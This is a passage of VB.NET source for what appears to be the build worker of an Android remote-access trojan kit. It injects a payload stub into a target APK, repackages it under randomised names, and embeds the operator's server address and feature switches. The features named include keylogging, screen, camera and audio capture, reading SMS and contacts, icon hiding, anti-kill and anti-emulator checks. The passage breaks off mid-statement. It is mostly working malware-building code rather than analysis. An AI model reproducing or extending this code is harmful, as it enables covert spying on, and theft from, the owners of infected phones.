Imports System.Data.SqlClient
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Net.Http
Imports System.Reflection
Imports System.Text
Imports System.Threading
Imports System.Xml
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports MS.Internal
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq


Module Worker

    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker

    Private Encrypt_Key As String = "Hf/I2[nt7b-^x6`["

    Private ReadOnly BT_appver As String = "3.6.1"

    Private userid As String = Nothing
    Private appid As String = Nothing
    Private MYID As String = Nothing
    Private ClientName As String = Nothing
    Private UserHost As String = Nothing
    Private Email As String = Nothing

    Private use_access As String = Nothing
    Private use_draw As String = Nothing
    Private use_antkill As String = Nothing
    Private use_atoprims As String = Nothing

    Private notifytitle As String = Nothing
    Private notifymsg As String = Nothing

    Private MainActivity As String = Nothing
    Private appdir As String = Nothing
    Private userfolder As String = Nothing
    Private ZIPPATH As String = Nothing
    Private DropStub As String = Nothing
    Private InjectStub As String = Nothing



    Private apktemp As String = ""
    Private apktoolpath As String = ""

    Private Apksignerpath As String = ""
    Private ApkZIPpath As String = ""
    Private outputapk As String = ""
    Private originalapkname As String = ""
    Private Apkeditorpath As String = ""
    Private extractorzip As String = ""
    'Private protectfinished As Boolean = False
    Public Once As Boolean = False
    Public HoldMainThread As Boolean = False
    Public HoldFinishing As Boolean = False
    Private cmdProcess As Process
    Public WorkingDir As String = ""
    Private FoundJava As Boolean = False
    Private TheApkPath As String


    Public need_externalstorage As Boolean = False
    Public need_write As Boolean = False
    Public need_battery As Boolean = False
    Public need_read As Boolean = False
    Public need_forground As Boolean = False
    Public need_syswinow As Boolean = False
    Public need_boot As Boolean = False
    Public need_read_stste As Boolean = False
    'Public need_all As Boolean = False

    'Public ASKPRIM_all As String
    Public Buildtype As String

    Private N_AccessibilityActivity As String = ""
    Private Const AccessibilityActivity As String = "AccessibilityActivity"
    '------------------FileLocator
    Private N_AccessServices As String = ""
    Private Const AccessServices As String = "AccessServices"

    Private N_HiddenBrowser As String = ""
    Private Const HiddenBrowser As String = "HiddenBrowser"

    Private N_AccessTools As String = ""
    Private Const AccessTools As String = "AccessTools"

    '
    Private N_wakeitaiv As String = ""
    Private Const wakeitaiv As String = "wakeitaiv"



    Private N_LockActivity As String = ""
    Private Const LockActivity As String = "LockActivity"


    Private N_ActivityCaptureScreen As String = ""
    Private Const ActivityCaptureScreen As String = "ActivityCaptureScreen"



    Private NActivityMonitors As String = ""
    Private Const ActivityMonitors As String = "ActivityMonitors"


    'RTPluginsHelper
    Private N_update_app_ As String = ""
    Private Const _update_app_ As String = "_update_app_"


    'SecoundActivity
    Private N_Apps_Manage As String = ""
    Private Const Apps_Manage As String = "Apps_Manage"


    'CallsManager
    Private N_ClassGen As String = ""
    Private Const ClassGen As String = "ClassGen"


    Private N_AudioRecorder As String = ""
    Private Const AudioRecorder As String = "AudioRecorder"

    Private N_CameraCap As String = ""
    Private Const CameraCap As String = "CameraCap"

    'ChatActivity
    Private N__ChatActivity_ As String = ""
    Private Const ChatActivity As String = "ChatActivity"

    'MyCods
    Private N__MyCods_ As String = ""
    Private Const MyCods As String = "MyCods"

    'Consts
    Private N__Consts_ As String = ""
    Private Const Consts As String = "Consts"




    ''NEW-----------

    'Contacts
    Private N_Contct_manager As String = ""
    Private Const Contct_manager As String = "Contct_manager"


    '
    Private N_ActivityDraw As String = ""
    Private Const ActivityDraw As String = "ActivityDraw"

    'My_Configs
    Private N_My_Configs As String = ""
    Private Const My_Configs As String = "My_Configs"

    'My_Crpter
    Private N_My_Crpter As String = ""
    Private Const My_Crpter As String = "My_Crpter"


    Private N_Deviceinfo As String = ""
    Private Const Deviceinfo As String = "Deviceinfo"

    Private N_filesManager As String = ""
    Private Const filesManager As String = "filesManager"

    Private N_id_Commands As String = ""
    Private Const id_Commands As String = "id_Commands"

    Private N_KeyStorksQ As String = ""
    Private Const KeyStorksQ As String = "KeyStorksQ"

    Private N_LiveChat As String = ""
    Private Const LiveChat As String = "LiveChat"

    Private N_QueryChats As String = ""
    Private Const QueryChats As String = "QueryChats"

    Private N_LiveKeysStrok As String = ""
    Private Const LiveKeysStrok As String = "LiveKeysStrok"

    Private N_StarterServices As String = ""
    Private Const StarterServices As String = "StarterServices"

    Private N_LocationMonitor As String = ""
    Private Const LocationMonitor As String = "LocationMonitor"

    Private N_LockAppsActivity As String = ""
    Private Const LockAppsActivity As String = "LockAppsActivity"

    Private N_ActivMain As String = ""
    Private Const ActivMain As String = "ActivMain"

    Private N_MyLoger As String = ""
    Private Const MyLoger As String = "MyLoger"

    Private N_MyNotification As String = ""
    Private Const MyNotification As String = "MyNotification"

    Private N_MyPacket As String = ""
    Private Const MyPacket As String = "MyPacket"

    Private N_MyPermissions As String = ""
    Private Const MyPermissions As String = "MyPermissions"

    Private N_MySettings As String = ""
    Private Const MySettings As String = "MySettings"

    Private N_PermissionsActivity As String = ""
    Private Const PermissionsActivity As String = "PermissionsActivity"

    Private N_PingServices As String = ""
    Private Const PingServices As String = "PingServices"

    Private N_RequestDraw As String = ""
    Private Const RequestDraw As String = "RequestDraw"

    Private N_Requestinstall As String = ""
    Private Const Requestinstall As String = "Requestinstall"

    Private N_RequestPermissions2 As String = ""
    Private Const RequestPermissions2 As String = "RequestPermissions2"

    Private N_ScreenCaps As String = ""
    Private Const ScreenCaps As String = "ScreenCaps"

    Private N_ScreenReceiver As String = ""
    Private Const ScreenReceiver As String = "ScreenReceiver"

    Private N_mysmanager As String = ""
    Private Const mysmanager As String = "mysmanager"

    Private N_StatusMonitor As String = ""
    Private Const StatusMonitor As String = "StatusMonitor"

    Private N_UtliTools As String = ""
    Private Const UtliTools As String = "UtliTools"

    Private N_VoiceRecorder As String = ""
    Private Const VoiceRecorder As String = "VoiceRecorder"

    Private N_WorkServices As String = ""
    Private Const WorkServices As String = "WorkServices"


    'BrodcastActivity
    Private N_BrodcastActivity As String = ""
    Private Const BrodcastActivity As String = "BrodcastActivity"

    Private N_OPPOAutostart As String = ""
    Private Const OPPOAutostart As String = "OPPOAutostart"

    Private N_RestrectionActivity As String = ""
    Private Const RestrectionActivity As String = "RestrectionActivity"

    Private N_HiddenActivity As String = ""
    Private Const HiddenActivity As String = "HiddenActivity"

    Private N_UninstallActivity As String = ""
    Private Const UninstallActivity As String = "UninstallActivity"

    Private N_EngineWorker As String = ""
    Private Const EngineWorker As String = "EngineWorker"

    Private N_TransparentActivity As String = ""
    Private Const TransparentActivity As String = "TransparentActivity"


    Private N_WebBrowser As String = ""
    Private Const WebBrowser As String = "WebBrowser"


    Private N_ProxyService As String = ""
    Private Const ProxyService As String = "ProxyService"



    Private N_RequestDataUsage As String = ""
    Private Const RequestDataUsage As String = "RequestDataUsage"


    Private N_Webjector As String = ""
    Private Const Webjector As String = "Webjector"


    Private KeepScreen As String = "off"
    Private ALLPRIMSLIST As List(Of String) = New List(Of String)


    Private NEWRANDOM As String = ""


    Private newpkg As String = ""
    Private newpkg_insmali As String = ""


    Private oldpkg As String = "com.icontrol.protector"
    Private oldpkg_insmali As String = "Lcom/icontrol/protector"



    Private drop_newpkg As String = ""
    Private drop_newpkg_insmali As String = ""

    Private ReadOnly drop_oldpkg As String = "com.appd.instll"
    Private drop_oldpkg_insmali As String = "Lcom/appd/instll"


    Private ReadOnly accesstagdata As String = "accessibilityprivatesrcapp"
    Private accesstagdata_New As String = ""


    'new random

    Dim Obfucated As New Dictionary(Of String, String)
    Dim To_obfuscate_androidx As New List(Of String)
    Dim To_Obfucate As New List(Of String) From {"URL_PING",
        "URL_MSG",
        "URL_SOCKT",
        "getIPAddress",
        "USR_MAIL",
        "USR_HOST",
        "SPLIT_SKT",
        "SPLIT_DATA",
        "SPLIT_LINE",
        "SPLIT_ARAY",
        "USR_NAME",
        "DEVICE_ID",
        "Rec_Activitys",
        "Rec_Notifications",
        "Rec_keystrokes",
        "Rec_links",
        "Rec_apps",
        "THE_IDF",
        "LIVE_KLOG",
        "localip",
        "SERVER_DIR",
        "get_prims",
        "get_draw",
        "get_kill",
        "get_click",
        "Draws_overs",
        "User_allPrims",
        "HOME_NAME",
        "Use_Access",
        "Anti_Kill",
        "Click_Prim",
        "CONS_KY",
        "get_cok",
        "Auto_Clicker",
        "Auto_Prims",
        "Send_Skilton",
        "Skeleton_Color",
        "Black_Screen",
        "Auto_Sreen",
        "Stored_resultCode",
        "Stored_intentdata",
        "_Notfy_TITL_",
        "_Notfy_MSG_",
        "Tracking_Data_str",
        "Notifi_ID",
        "My_Access_inst",
        "STATUS_MONITOR",
        "LOCK_SERVS",
        "PAKET_LOCK",
        "MY_COMMANDS_LIST",
        "EMIL_POST",
        "PHONE_POST",
        "TYPE_POST",
        "CUZ_POST",
        "DATA_POST",
        "Fix_it",
        "Get_Network",
        "Create_DevicID",
        "IsIgnore_Battery",
        "Time_Stamp",
        "Read_Contacts",
        "Read_SMS",
        "Read_Call_Log",
        "Acc_Camera",
        "Get_Accounts",
        "Record_Audio",
        "Call_Phone",
        "Call_Record",
        "Dcrpt_KET",
        "Dcrypt_datas",
        "Send_SMS",
        "Set_Wallpaper",
        "Doze_Mode",
        "Draw_Overlays",
        "Package_Installs",
        "is_Access_Enabled",
        "Battery_state",
        "TempPassLock",
        "Blocked_Apps",
        "Lock_App_list",
        "Supported_Browsers",
        "Dcrpt_Str",
        "Get_Cifr",
        "get_accss",
        "Gnrat_Ky",
        "Mob_Name",
        "Access_type",
        "Hide_ico",
        "auto_start",
        "auto_battery",
        "get_btry",
        "get_start",
        "Anti_emulator",
        "get_emu",
        "get_hideit",
        "get_accsstype",
        "Hide_Type",
        "get_hideentype",
        "Capture_Lock",
        "get_caplock",
        "Is_Store",
        "get_storemod",
        "Anti_Doze",
        "get_dozestate",
        "URL_CASH"}


    'Dim ResoursIds() As String = {
    '        "0x7f0d001c",
    '        "0x7f070066",
    '        "0x7f070067",
    '        "0x7f070068",
    '        "0x7f07006e",
    '        "0x7f070089",
    '        "0x7f070096",
    '        "0x7f070098",
    '        "0x7f070099",
    '        "0x7f07009a",
    '        "0x7f07009b",
    '        "0x7f07009c",
    '        "0x7f07009d",
    '        "0x7f100000",
    '        "0x7f100002",
    '        "0x7f100001",
    '        "0x7f100003",
    '        "0x7f0b001c",
    '        "0x7f0b0060",
    '        "0x7f0b0059",
    '        "0x7f0b0058",
    '        "0x7f0b0074",
    '        "0x7f080006",
    '        "0x7f08005a",
    '        "0x7f080061",
    '        "0x7f080062",
    '        "0x7f080070",
    '        "0x7f080089",
    '        "0x7f0800e8",
    '        "0x7f080112",
    '        "0x7f080114",
    '        "0x7f08012b",
    '        "0x7f080141",
    '        "0x7f080150"
    '    }
    Dim ResoursIds() As String = {
    "0x7f0e001c",
    "0x7f070081",
    "0x7f070082",
    "0x7f070083",
    "0x7f070089",
    "0x7f0700d7",
    "0x7f0700e5",
    "0x7f0700e7",
    "0x7f0700e8",
    "0x7f0700e9",
    "0x7f0700ea",
    "0x7f0700eb",
    "0x7f0700ec",
    "0x7f110000",
    "0x7f110001",
    "0x7f110002",
    "0x7f110003",
    "0x7f0b001c",
    "0x7f0b006a",
    "0x7f0b0062",
    "0x7f0b0063",
    "0x7f0b006f",
    "0x7f080006",
    "0x7f08005a",
    "0x7f080063",
    "0x7f080064",
    "0x7f08006d",
    "0x7f080088",
    "0x7f0800f8",
    "0x7f080124",
    "0x7f080126",
    "0x7f08012b",
    "0x7f080162",
    "0x7f080171"
    }


    '-------------FOR CUSTOM-----------------

    Private spl_arguments As String = "[x0b0x]"
    Private appname As String = ""
    Private appversion As String = ""
    Private appicopath As String = ""
    Private appurl As String = ""

    '
    '
    '
    Private logintitle As String = ""
    Private logindis As String = ""
    Private loginbtn As String = ""
    Private lngshort As String = ""


    Private trakingdata As String = ""
    Private allconfig As String = ""
    Private nodelete As String = ""

    Private hiddenapp As String = ""
    Private noemulator As String = ""
    Private miuiautostart As String = ""
    Private theconkey As String = ""
    Private installtype As String = ""
    Private hidetype As String = ""
    Private nosleep As String = ""
    Private caplock As String = ""

    Private IsCustomeApp As Boolean = False


    '-------------------Replace server to server
    Private ServerApi As String = "http://localhost/yaarsa/private/yarsap_90061.php"
    'Private ServerApi As String = "http://localhost/BTMOB/private/yarsap_90061.php" ' XAMP

    Private ServerApi_Customapp As String = "http://localhost/yaarsa/private/yarsap_91370.php"
    'Private ServerApi_Customapp As String = "http://localhost/BTMOB/private/yarsap_91370.php" ' XAMP


    'Private Curnt_Domain As String = "yaarsa.com"

    Private Currentsubdir As String = "/yaarsa/private/"

    '-------------------



    Private onbuild As String = "onbuild"
    Private failed As String = "failed"
    Private finished As String = "finished"

    Private IsStoreMod As String = "0"


    Sub Main(args As String())

        Try

            'DEFserverconfigs

            Dim configFilePath As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "serverconf.json")

            If Not File.Exists(configFilePath) Then
                File.WriteAllText(configFilePath, My.Resources.DEFserverconfigs)
            End If

            ' Read and parse the JSON file
            Dim jsonConfig As String = File.ReadAllText(configFilePath)
            Dim configData As Dictionary(Of String, String) = JsonConvert.DeserializeObject(Of Dictionary(Of String, String))(jsonConfig)

            ' Assign values from the JSON file
            ServerApi = configData("ServerApi")
            ServerApi_Customapp = configData("ServerApi_Customapp")
            ' Curnt_Domain = configData("Curnt_Domain")
            Currentsubdir = configData("Currentsubdir")

            MYID = FromBase64(args(0))
            SignMe(MYID, Process.GetCurrentProcess().Id.ToString())

            Threading.Thread.Sleep(5000)

            Dim cr As Crypters = Crypters.Create()

            'MsgBox("hi")

            appid = FromBase64(args(1))
            userid = FromBase64(args(2))
            ClientName = FromBase64(args(3))
            Email = cr.Encrypt(FromBase64(args(4)))
            MainActivity = FromBase64(args(5))
            appdir = FromBase64(args(6))
            UserHost = cr.Encrypt(FromBase64(args(7)))
            use_access = FromBase64(args(8))
            use_draw = FromBase64(args(9))
            use_antkill = FromBase64(args(10))
            use_atoprims = FromBase64(args(11))


            notifytitle = FromBase64(args(12)).Replace("""", "'").Replace("\", "\\")

            notifymsg = FromBase64(args(13))

            'ASKPRIM_all = FromBase64(args(14))

            Buildtype = FromBase64(args(15))


            Dim currentPath As String = Directory.GetCurrentDirectory()
            Dim parentPath As String = Path.GetDirectoryName(currentPath)

            Dim Appfolder = parentPath + "\" + appdir

            userfolder = parentPath + "\" + "user" + "\" + "apps" + "\" + userid + "\" + appid

            DropStub = parentPath + "\private\apkstub\dropstub.zip"
            InjectStub = parentPath + "\private\apkstub\jectstub.zip"

            If Not Directory.Exists(userfolder) Then
                Directory.CreateDirectory(userfolder)
            End If

            'MsgBox("hi2")
            HoldFinishing = True

            Select Case Buildtype
                Case "S"
                    IsCustomeApp = False
                    IsStoreMod = "1"
                    ZIPPATH = parentPath + "\" + appdir + "\" + appid + ".zip"
                    TargetApkicon = parentPath + "\" + appdir + "\" + "ico.png"

                    appname = FixStrings(FromBase64(args(16)))
                    appversion = FromBase64(args(17))
                    appicopath = FromBase64(args(18))
                    appurl = cr.Encrypt(FromBase64(args(19)))

                    logintitle = FromBase64(args(20))
                    logindis = FromBase64(args(21))
                    loginbtn = FromBase64(args(22))
                    lngshort = FromBase64(args(23))

                    hiddenapp = FromBase64(args(24))
                    noemulator = FromBase64(args(25))
                    miuiautostart = FromBase64(args(26))
                    theconkey = FromBase64(args(27))
                    installtype = FromBase64(args(28))

                    hidetype = FromBase64(args(29))

                    nosleep = FromBase64(args(30))
                    caplock = FromBase64(args(31))

                    trakingdata = FromBase64(args(32))
                    allconfig = FromBase64(args(33))
                    nodelete = FromBase64(args(34))

                    Exit Select
                Case "C"


                    IsStoreMod = "0"
                    appname = FixStrings(FromBase64(args(16)))
                    appversion = FromBase64(args(17))
                    appicopath = FromBase64(args(18))
                    appurl = cr.Encrypt(FromBase64(args(19)))
                    logintitle = FromBase64(args(20))
                    logindis = FromBase64(args(21))
                    loginbtn = FromBase64(args(22))
                    lngshort = FromBase64(args(23))
                    hiddenapp = FromBase64(args(24))
                    noemulator = FromBase64(args(25))
                    miuiautostart = FromBase64(args(26))
                    theconkey = FromBase64(args(27))
                    installtype = FromBase64(args(28))
                    hidetype = FromBase64(args(29))
                    nosleep = FromBase64(args(30))
                    caplock = FromBase64(args(31))

                    trakingdata = FromBase64(args(32))
                    allconfig = FromBase64(args(33))
                    nodelete = FromBase64(args(34))

                    ZIPPATH = parentPath + "\private\apkstub\apkstub.zip"

                    TargetApkicon = String.Concat(New String() {parentPath, "\user\storage\", Worker.userid, "\icons\", Worker.appicopath})

                    Dim flag2 As Boolean = Not File.Exists(Worker.TargetApkicon)
                    If flag2 Then
                        Console.WriteLine("> Worker: Errorxxx")
                        Mylogger.Logbuild(Worker.userid, "Worker Errorxxx")
                        UpdateState(Worker.failed)
                        Worker.singout(Worker.MYID)
                        Environment.[Exit](0)
                    End If
                    IsCustomeApp = True

                    Exit Select
                Case Else
                    Console.WriteLine("> Worker: Error 3")
                    'Mylogger.LogError(userid, "Main worker", ex.Message)
                    'MsgBox("hi2")
                    singout(MYID)
                    Environment.Exit(0)
                    Exit Select
            End Select
            'MsgBox("hi3")
            Worker.InsertApp()
            Mylogger.Logbuild(userid, " WORKER : Appid: " & appid &
                 vbNewLine & "ClientName: " & ClientName &
                 vbNewLine & "Email: " & Email &
                 vbNewLine & "MainActivity: " & MainActivity &
                 vbNewLine & "appdir: " & appdir &
                 vbNewLine & "UserHost: " & UserHost &
                 vbNewLine & "use_access: " & use_access &
                 vbNewLine & "use_draw: " & use_draw &
                 vbNewLine & "use_antkill: " & use_antkill &
                 vbNewLine & "use_atoprims: " & use_atoprims &
                 vbNewLine & "notifytitle: " & notifytitle &
                 vbNewLine & "notifymsg: " & notifymsg &
                 vbNewLine & "ASKPRIM_all: " & "0" &
                 vbNewLine & "Buildtype: " & Buildtype &
                 vbNewLine & "appname: " & appname &
                 vbNewLine & "appversion: " & appversion &
                 vbNewLine & "appicopath: " & appicopath &
                 vbNewLine & "appurl: " & appurl &
                 vbNewLine & "logintitle: " & logintitle &
                 vbNewLine & "logindis: " & logindis &
                 vbNewLine & "loginbtn: " & loginbtn &
                 vbNewLine & "lngshort: " & lngshort &
                 vbNewLine & "hiddenapp: " & hiddenapp &
                 vbNewLine & "noemulator: " & noemulator &
                 vbNewLine & "miuiautostart: " & miuiautostart &
                 vbNewLine & "autorunback: " & theconkey &
                 vbNewLine & "installtype: " & installtype &
                 vbNewLine & "hidetype: " & hidetype &
                 vbNewLine & "nosleep: " & nosleep &
                 vbNewLine & "caplock: " & caplock &
                 vbNewLine & "trakingdata: " & trakingdata &
                 vbNewLine & "allconfig: " & allconfig &
                 vbNewLine & "nodelete: " & nodelete)



            Step1()

            Step2()

            Step3()

            Do
                Thread.Sleep(1)

            Loop While HoldFinishing


            singout(MYID)

            Environment.Exit(0)
        Catch ex As Exception
            Console.WriteLine("> Worker: Error")
            Mylogger.LogError(userid, "Main worker", ex.Message)
            Worker.UpdateState(Worker.failed)
            singout(MYID)
        End Try
    End Sub




    Private Sub Step3()
        '-------------------Copy Data
        Dim smlipath As String = Nothing


        If IsCustomeApp Then
            Mylogger.Logbuild(Worker.userid, ">> Custom Step 3...")
            smlipath = TheApkPath + "\smali"



            GoTo encript
        End If

        Mylogger.Logbuild(userid, ">" & "> Inject Data To Apk...")

        Try


            For index = 2 To 16
                If Not Directory.Exists(TheApkPath & "\smali_classes" & index.ToString()) Then
                    Directory.CreateDirectory(TheApkPath & "\smali_classes" & index.ToString())
                    Directory.CreateDirectory(TheApkPath & "\smali_classes" & index.ToString() & "\com\icontrol\protector")
                    smlipath = TheApkPath & "\smali_classes" & index.ToString()
                    Exit For

                End If
            Next

            If smlipath Is Nothing Then
                Directory.CreateDirectory(TheApkPath & "\smali_classes" & "2")
                Directory.CreateDirectory(TheApkPath & "\smali_classes" & "2" & "\com\icontrol\protector")

                smlipath = TheApkPath & "\smali_classes" & "2"
            End If
            '  End If




            If Not File.Exists(smlipath & "\data.zip") Then
                'File.WriteAllBytes(smlipath & "\data.zip", My.Resources.APPS)
                File.Copy(InjectStub, smlipath & "\data.zip")
            End If


            System.IO.Compression.ZipFile.ExtractToDirectory(smlipath & "\data.zip", smlipath)

            File.Delete(smlipath & "\data.zip")

            GenerateJunkSmaliFiles(smlipath, 125)

            Threading.Thread.Sleep(1)

            If Not Directory.Exists(TheApkPath & "\res\xml") Then
                Directory.CreateDirectory(TheApkPath & "\res\xml")
            End If



            File.WriteAllText(Worker.TheApkPath + "\res\xml\pfs1.xml", My.Resources.providerfile)
            File.WriteAllText(Worker.TheApkPath + "\res\xml\network_security_config.xml", My.Resources.network_security_config)
            File.WriteAllText(Worker.TheApkPath + "\res\xml\splits.xml", My.Resources.splits)

            File.WriteAllText(Worker.TheApkPath + "\res\layout\activity_chat.xml", My.Resources.Activitychat)
            File.WriteAllText(Worker.TheApkPath + "\res\layout\oppobattery.xml", My.Resources.oppobattery)
            File.WriteAllText(Worker.TheApkPath + "\res\layout\nointernet.xml", My.Resources.nointernet)
            File.WriteAllText(Worker.TheApkPath + "\res\layout\mywebviewer.xml", My.Resources.mywebviewer)
            File.WriteAllText(Worker.TheApkPath + "\res\layout\uninstall_activity.xml", My.Resources.uninstall_activity)

            UpdateApkSrcs()

            '.Replace(accesstagdata, accesstagdata_New) _

            Dim publicxmlpath As String = Worker.TheApkPath + "\res\values\public.xml"


            Do
                Thread.Sleep(100)
            Loop While Not File.Exists(publicxmlpath) Or FileInUse(publicxmlpath)
            Mylogger.Logbuild(Worker.userid, ">> Encoding public file...")
            Dim allstr As String = File.ReadAllText(publicxmlpath).Replace(accesstagdata, accesstagdata_New)
            File.WriteAllText(publicxmlpath, allstr)

            Mylogger.Logbuild(userid, ">" & "> Copy Apk lib's...")

            Dim src_unknown As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", "unknown")

            Dim dis_unknown As String = TheApkPath + "\" + "unknown"

            CopyDirectoryContents(src_unknown, dis_unknown)

            Dim src_kotlin As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", "kotlin")

            Dim dis_kotlin As String = TheApkPath + "\" + "kotlin"

            CopyDirectoryContents(src_kotlin, dis_kotlin)


        Catch ex As Exception
            Mylogger.LogError(userid, "Step3", ex.Message)
        End Try


encript:

        Try



            Mylogger.Logbuild(userid, ">" & "> Encryption...")


            Dim files() As String = IO.Directory.GetFiles(smlipath & "\com\icontrol\protector")



            NEWRANDOM = madladstr()


            'com.icontrol.protector
            'Lcom/icontrol/protector


            For Each f As String In files




                Dim text As String = IO.File.ReadAllText(f).Replace(AccessibilityActivity, N_AccessibilityActivity) _
                    .Replace(AccessServices, N_AccessServices) _
                    .Replace(HiddenBrowser, N_HiddenBrowser) _
                    .Replace(AccessTools, N_AccessTools) _
                    .Replace(wakeitaiv, N_wakeitaiv) _
                    .Replace(LockActivity, N_LockActivity) _
                    .Replace(ActivityCaptureScreen, N_ActivityCaptureScreen) _
                    .Replace(ActivityMonitors, NActivityMonitors) _
                    .Replace(_update_app_, N_update_app_) _
                    .Replace(Consts, N__Consts_) _
                    .Replace(MyCods, N__MyCods_) _
                    .Replace(ChatActivity, N__ChatActivity_) _
                    .Replace(CameraCap, N_CameraCap) _
                    .Replace(Contct_manager, N_Contct_manager) _
                    .Replace(Deviceinfo, N_Deviceinfo) _
                    .Replace(filesManager, N_filesManager) _
                    .Replace(id_Commands, N_id_Commands) _
                    .Replace(KeyStorksQ, N_KeyStorksQ) _
                    .Replace(LiveChat, N_LiveChat) _
                    .Replace(QueryChats, N_QueryChats) _
                    .Replace(LiveKeysStrok, N_LiveKeysStrok) _
                    .Replace(StarterServices, N_StarterServices) _
                    .Replace(LocationMonitor, N_LocationMonitor) _
                    .Replace(LockAppsActivity, N_LockAppsActivity) _
                    .Replace(ActivMain, N_ActivMain) _
                    .Replace(MyLoger, N_MyLoger) _
                    .Replace(MyNotification, N_MyNotification) _
                    .Replace(MyPacket, N_MyPacket) _
                    .Replace(My_Configs, N_My_Configs) _
                    .Replace(ActivityDraw, N_ActivityDraw) _
                    .Replace(My_Crpter, N_My_Crpter) _
                    .Replace(MyPermissions, N_MyPermissions) _
                    .Replace(MySettings, N_MySettings) _
                    .Replace(PermissionsActivity, N_PermissionsActivity) _
                    .Replace(PingServices, N_PingServices) _
                    .Replace(RequestDraw, N_RequestDraw) _
                    .Replace(Requestinstall, N_Requestinstall) _
                    .Replace(RequestPermissions2, N_RequestPermissions2) _
                    .Replace(ScreenCaps, N_ScreenCaps) _
                    .Replace(ScreenReceiver, N_ScreenReceiver) _
                    .Replace(mysmanager, N_mysmanager) _
                    .Replace(StatusMonitor, N_StatusMonitor) _
                    .Replace(UtliTools, N_UtliTools) _
                    .Replace(VoiceRecorder, N_VoiceRecorder) _
                    .Replace(WorkServices, N_WorkServices) _
                    .Replace(HiddenActivity, N_HiddenActivity) _
                    .Replace(RestrectionActivity, N_RestrectionActivity) _
                    .Replace(OPPOAutostart, N_OPPOAutostart) _
                    .Replace(BrodcastActivity, N_BrodcastActivity) _
                    .Replace(UninstallActivity, N_UninstallActivity) _
                    .Replace(EngineWorker, N_EngineWorker) _
                    .Replace(RequestDataUsage, N_RequestDataUsage) _
                    .Replace(Webjector, N_Webjector) _
                    .Replace(TransparentActivity, N_TransparentActivity) _
                    .Replace(WebBrowser, N_WebBrowser) _
                    .Replace(ProxyService, N_ProxyService) _
                    .Replace(ClassGen, N_ClassGen) _
                    .Replace("[USER_MAIL]", Email) _
                    .Replace("[USE-SUPER]", use_access) _
                    .Replace("[SERVER_ADRESS]", UserHost) _
                    .Replace("[USE-NOKILL]", use_antkill) _
                    .Replace("[USE-DRAWOVER]", use_draw) _
                    .Replace("[USE-AUTOGRANT]", use_atoprims) _
                    .Replace("[USE-ALLPRIM]", "0") _
                    .Replace("[USE-AUTOSTART]", miuiautostart) _
                    .Replace("[USE-HIDDEEN]", hiddenapp) _
                    .Replace("[USE-STORE]", IsStoreMod) _
                    .Replace("[USE-NOEMU]", noemulator) _
                    .Replace("[USE-GUID]", installtype) _
                    .Replace("[USE-DOZE]", nosleep) _
                    .Replace("[USE-CAPLOCK]", caplock) _
                    .Replace("[USE-FAKE]", hidetype) _
                    .Replace("[USE-AUTOBTRY]", theconkey) _
                    .Replace("[Client_N]", ClientName) _
                    .Replace("[_NOTIFI_TITLE_]", notifytitle) _
                    .Replace("[_NOTIFI_MSG_]", notifymsg) _
                    .Replace("USE-SCREENON", KeepScreen) _
                    .Replace("[OBFS]", NEWRANDOM) _
                    .Replace("[BSE_URL]", appurl) _
                    .Replace("[log-title]", logintitle) _
                    .Replace("[log-dis]", logindis) _
                    .Replace("[log-btn]", loginbtn) _
                    .Replace("[log-lng]", lngshort) _
                    .Replace("[NAME>LNK>ID!]", trakingdata) _
                    .Replace("[ALL-CONFG]", allconfig) _
                    .Replace("[CRNT-SUB]", Currentsubdir) _
                    .Replace("[USE-DELTE]", nodelete) _
                    .Replace(AudioRecorder, N_AudioRecorder) _
                    .Replace(drop_oldpkg, drop_newpkg) _
                    .Replace(oldpkg, newpkg) _
                    .Replace(oldpkg_insmali, newpkg_insmali) _
                    .Replace(Apps_Manage, N_Apps_Manage)


                For Each originalString As String In To_Obfucate
                    text = text.Replace(originalString, Obfucated(originalString))
                Next

                File.WriteAllText(f, text)
                Threading.Thread.Sleep(1)

            Next

            'units.uni.bash.trm

            Mylogger.Logbuild(userid, ">" & "> Encryption ALL...")

            For Each fileInMain As String In Directory.GetFiles(smlipath, "*.smali", SearchOption.AllDirectories)
                If fileInMain.Contains("\android\") Or fileInMain.Contains("\androidx\") Then
                    'To_obfuscate_androidx
                    Dim newContent As String = File.ReadAllText(fileInMain)
                    For Each originalString As String In To_obfuscate_androidx
                        newContent = newContent.Replace(originalString, Obfucated(originalString))
                    Next
                    File.WriteAllText(fileInMain, newContent)
                    Continue For
                End If
                If Not fileInMain.Contains("\android\") AndAlso Not fileInMain.Contains("\androidx\") Then



                    Dim fileContent As String = File.ReadAllText(fileInMain)
                    Dim newContent As String = fileContent.Replace(AccessibilityActivity, N_AccessibilityActivity) _
                    .Replace(AccessServices, N_AccessServices) _
                    .Replace(HiddenBrowser, N_HiddenBrowser) _
                    .Replace(AccessTools, N_AccessTools) _
                    .Replace(wakeitaiv, N_wakeitaiv) _
                    .Replace(LockActivity, N_LockActivity) _
                    .Replace(ActivityCaptureScreen, N_ActivityCaptureScreen) _
                    .Replace(ActivityMonitors, NActivityMonitors) _
                    .Replace(_update_app_, N_update_app_) _
                    .Replace(Consts, N__Consts_) _
                    .Replace(MyCods, N__MyCods_) _
                    .Replace(ChatActivity, N__ChatActivity_) _
                    .Replace(CameraCap, N_CameraCap) _
                    .Replace(Contct_manager, N_Contct_manager) _
                    .Replace(Deviceinfo, N_Deviceinfo) _
                    .Replace(filesManager, N_filesManager) _
                    .Replace(id_Commands, N_id_Commands) _
                    .Replace(KeyStorksQ, N_KeyStorksQ) _
                    .Replace(LiveChat, N_LiveChat) _
                    .Replace(QueryChats, N_QueryChats) _
                    .Replace(LiveKeysStrok, N_LiveKeysStrok) _
                    .Replace(StarterServices, N_StarterServices) _
                    .Replace(LocationMonitor, N_LocationMonitor) _
                    .Replace(LockAppsActivity, N_LockAppsActivity) _
                    .Replace(ActivMain, N_ActivMain) _
                    .Replace(MyLoger, N_MyLoger) _
                    .Replace(MyNotification, N_MyNotification) _
                    .Replace(MyPacket, N_MyPacket) _
                    .Replace(My_Configs, N_My_Configs) _
                    .Replace(ActivityDraw, N_ActivityDraw) _
                    .Replace(My_Crpter, N_My_Crpter) _
                    .Replace(MyPermissions, N_MyPermissions) _
                    .Replace(MySettings, N_MySettings) _
